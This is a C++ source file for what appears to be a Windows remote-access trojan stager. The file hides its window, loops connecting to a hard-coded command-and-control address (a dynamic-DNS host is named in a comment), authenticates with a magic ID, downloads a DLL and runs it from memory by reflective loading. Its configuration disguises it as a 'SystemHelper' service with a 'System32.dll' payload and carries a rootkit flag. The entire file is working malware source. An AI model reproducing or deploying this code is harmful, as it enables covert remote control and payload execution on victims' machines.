#include "stdafx.h"
#include <winsock2.h>
#pragma comment (lib, "Ws2_32.lib")

#if _MSC_VER < 1600
#pragma comment(linker,"/FILEALIGN:0x200 /OPT:NOWIN98")
#pragma comment(lib,"msvcrt.lib")
#endif

#define DE
#include "..\\..\\debug.h"

#include "MemLoadDll.h"

typedef struct _MsgHead
{
	int id;
	int buflen;
	DWORD lp;
}Msghead, *LPMsghead;

const int AuthId = 93226;
const int BuffSize = 256 * 1024;

struct DLL_INFO
{
	CHAR IdChar[32];
	CHAR LoginAddr[150];
	UINT LoginPort;
	char ServiceName[50];
	char Dllname[50];
	char ReMark[50];
	bool isRootkit;
}SysInfo =
{
	"StartOfHostAndConfig",
	"127.0.0.1",		//127.0.0.1 192.168.1.145 lkyfire.vicp.net
	80,
	"SystemHelper",
	"System32.dll",
	"lx",
	false,
};

unsigned long WINAPI resolve(char *host)
{
	long i = inet_addr(host);

	if (i >= 0)
	{
		return i;
	}

	struct hostent *ser = (struct hostent*)gethostbyname(host);

	if (ser == NULL)
	{
		ser = (struct hostent*)gethostbyname(host);  //retry
	}

	if (ser == NULL)
	{
		return 0;
	}

	return i = (*(unsigned long *)ser->h_addr);
}

DWORD _stdcall ConnectThread(LPVOID lParam)
{
	SOCKET h = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	SOCKADDR_IN addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SysInfo.LoginPort);
	addr.sin_addr.S_un.S_addr = resolve(SysInfo.LoginAddr);

	if (connect(h, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		MsgErr("Connect Error");
		Sleep(1000 * 10);
		return 0;
	}

	Msghead lp;
	lp.id = AuthId;
	send(h, (char *)&lp, sizeof(lp), 0);

	int rt = recv(h, (char *)&lp, sizeof(lp), 0);

	if (rt == 0 || lp.id != AuthId)
	{
		shutdown(h, 0);
		closesocket(h);
		MsgErr(_T("Authid Err or Recv Err"));
		return 0;
	}

	char *buf = (char *)VirtualAlloc(BuffSize);
	char *lpbuf = buf;
	int leftlen = lp.buflen;

	while (leftlen > 0)
	{
		rt = recv(h, lpbuf, leftlen, 0);

		if (rt == 0)
		{
			VirtualFree(buf, BuffSize);
			shutdown(h, 0);
			closesocket(h);
			MsgErr(_T("Recv Loop Err"));
			return 0;
		}

		leftlen -= rt;
		lpbuf += rt;
	}

	shutdown(h, 0);
	closesocket(h);

	HMEMORYMODULE hModule;

	hModule = MemoryLoadLibrary(buf);

	if (hModule == NULL)
	{
		MsgErr(_T("Load Dll Err"));
		VirtualFree(buf, BuffSize);

		return 0;
	}

	typedef BOOL(*_RoutineMain)(LPVOID lp);
	_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");

	RoutineMain(&SysInfo);

	MemoryFreeLibrary(hModule);

	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{
	HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
		L"#32770",
		L"WindowsNet",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		100,
		100,
		HWND_DESKTOP,
		NULL,
		GetModuleHandleW(0),
		NULL
		);

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

	GetInputState(); //-V530
	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);

	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);

	while (1)
	{
		__try
		{
			ConnectThread(NULL);
		}
		__except (1)
		{
			MsgErr(_T("Sys Err"));
		}

		Sleep(500);
	}

	WSACleanup();

	return 0;
}